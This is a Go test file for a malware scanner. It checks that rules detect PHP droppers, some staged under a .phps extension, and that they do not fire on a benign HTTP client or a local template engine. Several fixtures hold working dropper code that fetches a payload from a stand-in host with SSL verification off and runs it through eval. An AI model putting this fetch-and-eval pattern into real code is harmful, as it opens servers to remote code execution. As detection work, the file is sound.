package signatures

import "testing"

// Production sample (2026-07-29, staged as index.phps in a WordPress docroot):
// the remote fetch lives in a helper function and the payload runs with an
// HTML-mode prefix, so neither the curl_exec-adjacent pattern nor the
// eval-wrapping pattern sees it. The fetch and the execution sit tens of lines
// apart and the eval argument is a string literal, not the fetched variable.
func TestDropperRemoteHtmlmodeEval_FetchHelper(t *testing.T) {
	scanner := loadRepoScanner(t)

	malicious := []byte(`<?php
function fetchContent($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);

    $content = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return ($httpCode === 200) ? $content : false;
}

$url = 'https://payload.example.com/raw.php?id=ZndWqKLSdhQa';
$content = fetchContent($url);

if ($content !== false) {
    eval('?>' . $content);
}
`)

	matches := scanner.ScanContent(malicious, ".php")
	if !hasRule(matches, "dropper_remote_htmlmode_eval") {
		t.Error("dropper_remote_htmlmode_eval miss: remote fetch helper feeding eval('?>' . $var) was not detected")
	}
}

// ".phps" is PHP source by definition -- the extension exists to display it.
// Every PHP rule declares file_types [".php"], so unless the scanner treats the
// two alike a staged payload is read and then matched against nothing. Uses an
// already-matching pattern so this covers extension handling alone.
func TestScannerTreatsPhpsAsPHPSource(t *testing.T) {
	scanner := loadRepoScanner(t)

	malicious := []byte("<?php\neval(curl_exec($ch));\n")

	matches := scanner.ScanContent(malicious, ".phps")
	if !hasRule(matches, "dropper_curl_eval") {
		t.Error("dropper_curl_eval miss: .phps content was not matched against PHP rules")
	}
}

// A staged dropper keeps the same content under an extension a stock handler
// renders as source. Content scanning must not go blind on the extension alone.
func TestDropperRemoteHtmlmodeEval_UnderPhpsExtension(t *testing.T) {
	scanner := loadRepoScanner(t)

	malicious := []byte(`<?php
$ch = curl_init('https://payload.example.com/x');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$content = curl_exec($ch);
eval('?>' . $content);
`)

	matches := scanner.ScanContent(malicious, ".phps")
	if !hasRule(matches, "dropper_remote_htmlmode_eval") {
		t.Error("dropper_remote_htmlmode_eval miss: staged .phps payload was not scanned as PHP")
	}
}

// An HTTP client helper next to an unrelated template evaluator carries a
// remote fetch and an eval with no data flow between them, and no HTML-mode
// prefix. Neither dropper rule may fire.
func TestDropperRemoteHtmlmodeEval_HttpClientAndTemplateEvaluator(t *testing.T) {
	scanner := loadRepoScanner(t)

	legit := []byte(`<?php
class HttpClient {
    public function get($url) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $body = curl_exec($ch);
        curl_close($ch);
        return $body;
    }
}

class TemplateCompiler {
    public function render($compiledSource) {
        return eval($compiledSource);
    }
}
`)

	matches := scanner.ScanContent(legit, ".php")
	for _, rule := range []string{"dropper_remote_htmlmode_eval", "dropper_curl_eval"} {
		if hasRule(matches, rule) {
			t.Errorf("%s FP: HTTP client and template evaluator have no data flow between fetch and eval", rule)
		}
	}
}

// A local template engine that leaves PHP mode around a template it read off
// disk has the HTML-mode idiom but no network fetch. The corroboration
// requirement is what keeps it clean.
func TestDropperRemoteHtmlmodeEval_LocalTemplateEvaluator(t *testing.T) {
	scanner := loadRepoScanner(t)

	legit := []byte(`<?php
$template = file_get_contents(__DIR__ . '/views/page.tpl');
eval('?>' . $template);
`)

	matches := scanner.ScanContent(legit, ".php")
	if hasRule(matches, "dropper_remote_htmlmode_eval") {
		t.Error("dropper_remote_htmlmode_eval FP: local template read off disk is not a remote payload")
	}
}
